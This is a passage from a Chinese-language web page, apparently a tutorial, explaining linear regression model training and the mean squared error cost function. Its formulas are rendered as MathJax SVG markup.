-10H161Q125 -10 99 10T60 63T41 130T35 200ZM383 566Q383 668 330 668Q294 668 260 623T204 521T170 421T157 371Q206 370 254 370L351 371Q352 372 359 404T375 484T383 566ZM113 132Q113 26 166 26Q181 26 198 36T239 74T287 161T335 307L340 324H145Q145 321 136 286T120 208T113 132Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(502,-150) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g></g></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mrow data-mjx-texclass="ORD"><msub><mi>θ</mi><mn>1</mn></msub></mrow><mtext>~</mtext><mrow data-mjx-texclass="ORD"><msub><mi>θ</mi><mi>n</mi></msub></mrow></math></mjx-assistive-mml></mjx-container>：输入特征</li><li><mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="0.919ex" height="1ex" role="img" focusable="false" viewbox="0 -431 406 442" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D716" d="M227 -11Q149 -11 95 41T40 174Q40 262 87 322Q121 367 173 396T287 430Q289 431 329 431H367Q382 426 382 411Q382 385 341 385H325H312Q191 385 154 277L150 265H327Q340 256 340 246Q340 228 320 219H138V217Q128 187 128 143Q128 77 160 52T231 26Q258 26 284 36T326 57T343 68Q350 68 354 58T358 39Q358 36 357 35Q354 31 337 21T289 0T227 -11Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>ϵ</mi></math></mjx-assistive-mml></mjx-container>：误差项（服从正态分布）</li></ul><h3 id="模型训练">模型训练</h3><p>目标：找到最优参数<mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.023ex;" xmlns="http://www.w3.org/2000/svg" width="1.061ex" height="1.618ex" role="img" focusable="false" viewbox="0 -705 469 715" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D703" d="M35 200Q35 302 74 415T180 610T319 704Q320 704 327 704T339 705Q393 701 423 656Q462 596 462 495Q462 380 417 261T302 66T168 -10H161Q125 -10 99 10T60 63T41 130T35 200ZM383 566Q383 668 330 668Q294 668 260 623T204 521T170 421T157 371Q206 370 254 370L351 371Q352 372 359 404T375 484T383 566ZM113 132Q113 26 166 26Q181 26 198 36T239 74T287 161T335 307L340 324H145Q145 321 136 286T120 208T113 132Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>θ</mi></math></mjx-assistive-mml></mjx-container>使得预测误差最小化。</p><p><strong>损失函数</strong>：均方误差（MSE）</p><p><mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.798ex;" xmlns="http://www.w3.org/2000/svg" width="31.907ex" height="2.819ex" role="img" focusable="false" viewbox="0 -893.3 14103 1246.1" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43D" d="M447 625Q447 637 354 637H329Q323 642 323 645T325 664Q329 677 335 683H352Q393 681 498 681Q541 681 568 681T605 682T619 682Q633 682 633 672Q633 670 630 658Q626 642 623 640T604 637Q552 637 545 623Q541 610 483 376Q420 128 419 127Q397 64 333 21T195 -22Q137 -22 97 8T57 88Q57 130 80 152T132 174Q177 174 182 130Q182 98 164 80T123 56Q115 54 115 53T122 44Q148 15 197 15Q235 15 271 47T324 130Q328 142 387 380T447 625Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(633,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(1022,0)"><path data-c="1D703" d="M35 200Q35 302 74 415T180 610T319 704Q320 704 327 704T339 705Q393 701 423 656Q462 596 462 495Q462 380 417 261T302 66T168 -10H161Q125 -10 99 10T60 63T41 130T35 200ZM383 566Q383 668 330 668Q294 668 260 623T204 521T170 421T157 371Q206 370 254 370L351 371Q352 372 359 404T375 484T383 566ZM113 132Q113 26 166 26Q181 26 198 36T239 74T287 161T335 307L340 324H145Q145 321 136 286T120 208T113 132Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(1491,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(2157.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="mfrac" transform="translate(3213.6,0)"><g data-mml-node="mn" transform="translate(530.4,394) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"/></g><g data-mml-node="mrow" transform="translate(220,-345) scale(0.707)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(500,0)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g></g><rect width="1174.4" height="60" x="120" y="220"/></g><g data-mml-node="munderover" transform="translate(4794.6,0)"><g data-mml-node="mo"><path data-c="2211" d="M61 748Q64 750 489 750H913L954 640Q965 609 976 579T993 533T999 516H979L959 517Q936 579 886 621T777 682Q724 700 655 705T436 710H319Q183 710 183 709Q186 706 348 484T511 259Q517 250 513 244L490 216Q466 188 420 134T330 27L149 -187Q149 -188 362 -188Q388 -188 436 -188T506 -189Q679 -189 778 -162T936 -43Q946 -27 959 6H999L913 -249L489 -250Q65 -250 62 -248Q56 -246 56 -239Q56 -234 118 -161Q186 -81 245 -11L428 206Q428 207 242 462L57 717L56 728Q56 744 61 748Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(1089,477.1) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g></g><g data-mml-node="TeXAtom" transform="translate(1089,-285.4) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(345,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(1123,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(7081.2,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="msub" transform="translate(7470.2,0)"><g data-mml-node="mi"><path data-c="210E" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(609,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D703" d="M35 200Q35 302 74 415T180 610T319 704Q320 704 327 704T339 705Q393 701 423 656Q462 596 462 495Q462 380 417 261T302 66T168 -10H161Q125 -10 99 10T60 63T41 130T35 200ZM383 566Q383 668 330 668Q294 668 260 623T204 521T170 421T157 371Q206 370 254 370L351 371Q352 372 359 404T375 484T383 566ZM113 132Q113 26 166 26Q181 26 198 36T239 74T287 161T335 307L340 324H145Q145 321 136 286T120 208T113 132Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(8460.9,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="msup" transform="translate(8849.9,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(605,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(389,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(734,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(10299,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(10910.2,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z" style="stroke-width: 3;"/></g><g data-mml-node="msup" transform="translate(11910.4,0)"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(523,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(389,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(734,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="msup" transform="translate(13277.5,0)"><g data-mml-node="mo"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(422,363) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" style="stroke-width: 3;"/></g></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>J</mi><mo stretchy="false">(</mo><mi>θ</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mn>1</mn><mrow><mn>2</mn><mi>m</mi></mrow></mfrac><munderover><mo data-mjx-texclass="OP">∑</mo><mrow data-mjx-texclass="ORD"><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mrow data-mjx-texclass="ORD"><mi>m</mi></mrow></munderover><mo stretchy="false">(</mo><msub><mi>h</mi><mrow data-mjx-texclass="ORD"><mi>θ</mi></mrow></msub><mo stretchy="false">(</mo><msup><mi>x</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msup><mo stretchy="false">)</mo><mo>−</mo><msup><mi>y</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msup><msup><mo stretchy="false">)</mo><mn>2</mn></msup></math></mjx-assistive-mml></mjx-container></p><ul><li><mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.986ex" height="1.025ex" role="img" focusable="false" viewbox="0 -442 878 453" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>m</mi></math></mjx-assistive-mml></mjx-container>：样本数量。</li><li><mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="5.296ex" height="2.262ex" role="img" focusable="false" viewbox="0 -750 2340.6 1000" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="210E" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(609,-150) scale(0.707)"><path data-c="1D703" d="M35 200Q35 302 74 415T180 610T319 704Q320 704 327 704T339 705Q393 701 423 656Q462 596 462 495Q462 380 417 261T302 66T168 -10H161Q125 -10 99 10T60 63T41 130T35 200ZM383 566Q383 668 330 668Q294 668 260 623T204 521T170 421T157 371Q206 370 254 370L351 371Q352 372 359 404T375 484T383 566ZM113 132Q113 26 166 26Q181 26 198 36T239 74T287 161T335 307L340 324H145Q145 321 136 286T120 208T113 132Z" style="stroke-width: 3;"/></g></g><g data-mml-node="mo" transform="translate(990.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(1379.6,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(1951.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>h</mi><mi>θ</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></math></mjx-assistive-mml></mjx-container>：模型预测值。</li></ul><h2 id="损失函数-Cost-Function">损失函数(Cost Function)</h2><p>成本函数将告诉我们，模型的表现如何，以便使我们尝试使其变得更好。</p><p>成本函数公式如下：</p><mjx-container class="MathJax" jax="SVG" display="true" style="direction: ltr; display: block; text-align: center; margin: 1em 0; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -2.819ex;" xmlns="http://www.w3.org/2000/svg" width="31.783ex" height="6.354ex" role="img" focusable="false" viewbox="0 -1562.5 14048.2 2808.5" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43D" d="M447 625Q447 637 354 637H329Q323 642 323 645T325 664Q329 677 335 683H352Q393 681 498 681Q541 681 568 681T605 682T619 682Q633 682 633 672Q633 670 630 658Q626 642 623 640T604 637Q552 637 545 623Q541 610 483 376Q420 128 419 127Q397 64 333 21T195 -22Q137 -22 97 8T57 88Q57 130 80 152T132 174Q177 174 182 130Q182 98 164 80T123 56Q115 54 115 53T122 44Q148 15 197 15Q235 15 271 47T324 130Q328 142 387 380T447 625Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" 